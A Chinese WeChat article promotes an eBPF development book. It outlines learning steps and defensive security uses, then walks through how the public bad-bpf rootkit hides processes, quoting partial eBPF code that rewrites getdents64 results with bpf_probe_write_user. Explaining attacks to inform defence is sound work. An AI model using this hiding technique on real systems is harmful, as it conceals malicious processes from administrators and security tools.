---
title: eBPF开发指南从原理到应用如何学习
url: https://mp.weixin.qq.com/s?__biz=MzU3MTY5MzQxMA==&mid=2247484752&idx=1&sn=488c75243ec385aeda8c794e69785718&chksm=fcdd055dcbaa8c4bc476588f2467b3531d64c869ec3b4eea33f0b82d3153f79da8ef2fa34521&scene=58&subscene=0#rd
source: 软件安全与逆向分析
date: 2025-01-14
fetch_date: 2025-10-06T20:11:15.068479
---

# eBPF开发指南从原理到应用如何学习

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/k9S5z61JPnaQvxslibbRicZoulbUnOmdbc0lQqmiarmSHgasaK9FTZbUJp3mRe9eWx5yLV4W6ow7R1XSIiaO9JOvmQ/0?wx_fmt=jpeg)

# eBPF开发指南从原理到应用如何学习

原创

丰生强

软件安全与逆向分析

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/k9S5z61JPnaQvxslibbRicZoulbUnOmdbctfExib5PkMyHfP4odnvHMnWG1iaCFcnjcIvUopO7yteH077RITeFK4hg/640?wx_fmt=jpeg&from=appmsg)

在现代 Linux 生态系统中，**eBPF**（Extended Berkeley Packet Filter）已经成为一项炙手可热的技术。从网络性能优化、系统追踪到安全监控，eBPF 的应用领域不断扩大，它不仅是 Linux 内核的一部分，更是现代系统开发者和运维工程师的“瑞士军刀”。

在移动安全攻防对抗领域，eBPF技术也能大展拳脚，为了让更多的同行业人员能领略到该技术的应用场景与功能魅力，本公众号维护人员**非虫（同时也是多本软件安全与逆向分析的图书作者）**，与好友技术专家李泊冰一起共同创作了这本eBPF入门的技术图书-《eBPF开发指南：从原理到应用》，本书为那些想快速理解并学习 eBPF 的开发者与安全研究人员，提供了一个从入门到深入、从原理到应用的学习指南。

#### **如何学习 eBPF？**

学习 eBPF 涉及以下几个核心步骤：

1. **理解 eBPF 的基本原理**：

* 学习 eBPF 的历史、工作原理和运行机制。
* 掌握 eBPF 的核心模块和系统调用。

2. **掌握开发工具与环境搭建**：

* 了解 BCC、bpftrace、libbpf 等工具。
* 学会在不同操作系统上安装 eBPF 的开发环境。

3. **从入门程序开始**：

* 编写简单的 eBPF 程序，如基于 kprobe 的系统追踪程序。
* 掌握 eBPF 的指令集和验证机制。

4. **深度探索 eBPF 的功能模块**：

* 使用 BCC、bpftrace 等工具编写更复杂的程序。
* 结合 BTF 和 CO-RE 技术提高程序的可移植性。

5. **实战应用**：

* 探索 eBPF 在性能分析、网络安全、动态分析和云原生中的实际应用。

这本书的内容完全覆盖了以上学习步骤，并提供了系统性的指导。

## 以网络安全中的应用为例，eBPF在网络安全领域中有广泛的应用。它提供了一种灵活且高性能的方式来进行网络流量分析、数据包过滤和监控等任务。下面是一些常见的eBPF在网络安全中的应用：

1. **数据包过滤和防火墙**: eBPF可以用于实现高效的数据包过滤器，可根据各种条件（如源/目标IP地址、端口号、协议类型）对传入或传出的数据包进行筛选和处理，从而实现强大且可定制化的防火墙功能。众所周知，`iptables`作为主流Linux发行版本的防火墙规则配置工具，在新版本的系统上，结合eBPF的特性，可轻松实现使用eBPF技术跟踪Netfilter数据流过滤结果。使用XDP技术，可以在数据流在进入到内核网络处理栈前，高效的过滤与转发数据网络包。
2. **入侵检测系统（IDS）**: 利用eBPF，可以开发出高性能、低延迟并具备自定义规则支持的IDS。通过捕获和分析网络流量，结合自定义规则集，可以及时识别潜在攻击行为，并采取相应措施保护系统安全。IDS在云原生领域对应的是主机运行时安全监控工具。这类工具目前已经非常的多了，比如`Tracee`、`tetragon`等。
3. **反病毒扫描**: 使用eBPF技术，在内核层面对进出系统的文件进行动态扫描以检测恶意软件或病毒。这种方法比传统用户空间上运行的杀毒软件更有效率，并能够提供更好地保护。
4. **DDoS攻击防御**: 通过使用eBPF来监控网络流量的特征和行为模式，可以实时检测到DDoS攻击，并采取相应的反制措施，例如限制或封禁恶意IP地址。有兴趣的读者可以读一下“Detection of Denial of Service Attack in Cloud Based Kubernetes Using eBPF”这篇论文，讲解了使用eBPF检测DDOS的检测思路。
5. **安全审计**: eBPF可用于记录和分析系统中发生的各种事件和活动。通过捕获系统调用、网络连接等信息并进行分析，可以帮助检测潜在的安全漏洞或异常行为。这类工具中，`Sysdig`与`Falco`都有对应的工具，它们在老版本中使用内核模块实现相应的功能，新版本的系统，引入的eBPF探测模块，更加高效率与现代化。
6. **Rootkit攻击**：上面介绍的都是eBPF在网络安全中的防，而Rootkit则是攻击技术。在DEFCON中公开的一个名为bad-bpf的项目，完整的展示了使用eBPF实现的文件与进程隐藏、进程劫持、无痕迹添加管理员帐号、系统调用执行数据替换等亮眼的操作，这些攻击方式传统的反病毒软件完全无法感知，这些技术的公开，很好的诠释了在网络安全攻防中“未知攻，焉知防”的铁律。

我们来看一下，在bad-bpf项目中，进程隐藏技术的实现原理。要实现进程隐藏，即执行`ps`命令后，输出的结果中没有特定的进程信息。这就需要知道`ps`在执行时，到底干了什么，执行了哪些操作？揭示这一点其实不困难，只需要执行`strace ps`即可观察到它所有执行的系统调用。或者通过网络搜索，也很容易知道是一个名为`getdents64`的系统调用提供了数据的返回结果。

其实要干的事情，就是对`getdents64`系统调用执行后的返回数据进行修改，不返回我们指定的进程即可。要做到这一些，需要eBPF具备数据修改能力，这得益于系统调用返回的数据，是传入的用户态的结构体指针，这些数据是“用户态的”，这一点非常重要，eBPF提供了`bpf_probe_write_user()`接口用于修改用户态的数据，但并没有提供内核数据的修改能力，虽然可以修改eBPF的内核实现添加一个类似`bpf_probe_write_kernel()`，事实上我自己也这么干了，但通用场景下，为了系统的安全与稳定，eBPF并不支持内核数据的修改。

`bad-bpf`项目的pidhide.bpf.c文件是进程隐藏的eBPF实现部分，里面注册了3个eBPF方法：

```
SEC("tp/syscalls/sys_enter_getdents64")
int handle_getdents_enter(struct trace_event_raw_sys_enter *ctx){...}

SEC("tp/syscalls/sys_exit_getdents64")
int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx) {...}

SEC("tp/syscalls/sys_exit_getdents64")
int handle_getdents_patch(struct trace_event_raw_sys_exit *ctx) {...}
```

其实只是关注了`getdents64`的执行进入与退出，在进入时，记录下执行时的系统调用的第一个参数，它是一个`linux_dirent64`结构体指针，在系统调用返回时，开始解析这个结构体指针，核心代码如下：

```
...
unsigned int *pBPOS = bpf_map_lookup_elem(&map_bytes_read, &pid_tgid);
if (pBPOS != 0) {
    bpos = *pBPOS;
}

for (int i = 0; i < 200; i ++) {
    if (bpos >= total_bytes_read) {
        break;
    }
    dirp = (struct linux_dirent64 *)(buff_addr+bpos);
    bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirp->d_reclen);
    bpf_probe_read_user_str(&filename, pid_to_hide_len, dirp->d_name);

    int j = 0;
    for (j = 0; j < pid_to_hide_len; j++) {
        if (filename[j] != pid_to_hide[j]) {
            break;
        }
    }
    if (j == pid_to_hide_len) {
        bpf_map_delete_elem(&map_bytes_read, &pid_tgid);
        bpf_map_delete_elem(&map_buffs, &pid_tgid);
        bpf_tail_call(ctx, &map_prog_array, PROG_02);
    }
    bpf_map_update_elem(&map_to_patch, &pid_tgid, &dirp, BPF_ANY);
    bpos += d_reclen;
}

if (bpos < total_bytes_read) {
    bpf_map_update_elem(&map_bytes_read, &pid_tgid, &bpos, BPF_ANY);
    bpf_tail_call(ctx, &map_prog_array, PROG_01);
}
...
```

这段代码会循环读取返回数据中200个返回条目的`dirp->d_name`，也就是对应的进程名，如果找到了，则通过尾调用的形式执行`handle_getdents_patch()`来补丁改写`linux_dirent64`结构体指针。由于这是一个链式的数据结构，每一个条目的`d_reclen`字段指明了当前条目所占的字节数，遍历时只需要循环读取当前指针加上`d_reclen`字段后的值作为下一个条目的指针，判断是否为空。而改写的逻辑就是把上一个条目的`d_reclen`的值，加上当前需要隐藏的进程条目的`d_reclen`长度，然后使用`bpf_probe_write_user()`写回到上一条目的`d_reclen`字段，这样用户态程序在解析进程列表时，就会自动跳过了隐藏的进程信息，实现断链隐藏，代码如下所示：

```
...
bpf_probe_read_user(&d_reclen_previous, sizeof(d_reclen_previous), &dirp_previous->d_reclen);

struct linux_dirent64 *dirp = (struct linux_dirent64 *)(buff_addr+d_reclen_previous);
short unsigned int d_reclen = 0;
bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirp->d_reclen);

char filename[max_pid_len];
bpf_probe_read_user_str(&filename, pid_to_hide_len, dirp_previous->d_name);
filename[pid_to_hide_len-1] = 0x00;
bpf_printk("[PID_HIDE] filename previous %s\n", filename);
bpf_probe_read_user_str(&filename, pid_to_hide_len, dirp->d_name);
filename[pid_to_hide_len-1] = 0x00;
bpf_printk("[PID_HIDE] filename next one %s\n", filename);

// 尝试覆盖需要隐藏的条目
short unsigned int d_reclen_new = d_reclen_previous + d_reclen;
long ret = bpf_probe_write_user(&dirp_previous->d_reclen, &d_reclen_new, sizeof(d_reclen_new));
...
```

总之，eBPF在网络安全中提供了一种高效、灵活且可定制化的方式来监控、过滤和保护网络流量及系统。它能够结合内核层面的强大功能与用户空间上开发工具的灵活性，为网络安全领域带来了许多创新和改进。

#### **本书的结构与特点**

##### **1. 结构完整，循序渐进**

本书分为 13 章，内容由浅入深，从理论基础到实践应用，帮助读者逐步构建对 eBPF 的理解。

* **第 1～3 章：基础概念与开发环境**

+ 介绍 eBPF 的历史、工作原理和应用领域。
+ 指导读者搭建开发环境，包括安装工具（如 BCC、bpftrace）和配置 Linux 系统。

* **第 4～6 章：核心技术与工具**

+ 学习如何编写简单的 eBPF 程序，了解 eBPF 的指令集与验证机制。
+ 深入探索 BCC 和 bpftrace 工具的功能、语法和实际使用。

* **第 7～9 章：进阶开发与数据交换**

+ 使用 Go 语言开发 eBPF 程序，结合 libbpfgo 和 ebpf-go 提高开发效率。
+ 学习 eBPF 程序中数据结构（如 map）和数据交换机制（如环形缓冲区和 perf 事件）。

* **第 10～12 章：深入内核与性能分析**

+ 探讨 eBPF 程序的挂载点、内核辅助方法和性能分析技术。
+ 涉及 CPU、内存、磁盘 I/O 和网络的分析案例。

* **第 13 章：实战应用**

+ 结合多个实际场景展示 eBPF 的应用，如网络优化、动态分析和云原生场景下的增强功能。

##### **2. 内容详实，技术深度强**

* **工具链丰富**： 本书详细介绍了主流的 eBPF 工具链，包括 BCC、bpftrace、libbpf 等，帮助开发者选择适合自己的工具。
* **案例驱动**： 每个章节都通过案例进行技术讲解，例如：

+ 使用 BCC 编写 opensnoop。
+ 通过 bpftrace 实现动态追踪。
+ 使用 Go 语言和 libbpf 开发高性能网络应用。

* **前沿技术**： 书中涵盖了 CO-RE（Compile Once, Run Everywhere）和 BTF（BPF Type Format）等最新技术，帮助开发者提升 eBPF 程序的移植性和稳定性。

##### **3. 实战性强，面向实际应用**

除了理论和基础知识，书中还提供了丰富的实战案例，包括：

* 网络调试与优化。
* 性能分析工具的实现。
* 系统监控和动态追踪。

这些案例来自作者的实战经验，能够帮助读者快速上手，并应用到工作场景中。

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/k9S5z61JPnagibFHbJibmtyCM7IOiajRiaM0NuA7VKhACWn9uohpR26icDoZHQ4zxQH0vURtcmFkh5vzR5icYmY6cmibg/0?wx_fmt=png)

软件安全与逆向分析

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/k9S5z61JPnagibFHbJibmtyCM7IOiajRiaM0NuA7VKhACWn9uohpR26icDoZHQ4zxQH0vURtcmFkh5vzR5icYmY6cmibg/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过